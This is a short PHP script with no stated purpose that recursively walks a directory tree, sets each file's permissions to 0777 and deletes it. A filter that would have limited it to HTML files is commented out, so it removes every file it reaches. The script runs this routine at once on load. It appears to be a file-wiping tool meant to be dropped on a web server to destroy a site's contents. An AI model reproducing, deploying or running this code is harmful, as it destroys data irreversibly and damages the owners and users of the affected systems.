<?
$path='';
function hx_dirtree($path="."){
  global $somecontent;
  $d = dir($path);
  while(false !== ($v = $d->read())) {
    if($v == "." || $v == "..") continue;
	//if(pathinfo($v, PATHINFO_EXTENSION) != 'html') continue;
    $file = $d->path.DIRECTORY_SEPARATOR.$v;
    if(is_dir($file)) {
      hx_dirtree($file);
    }elseif(is_file($file)){
    chmod($file,0777);
    unlink($file);
    }
  }
  $d->close();
}
hx_dirtree($path);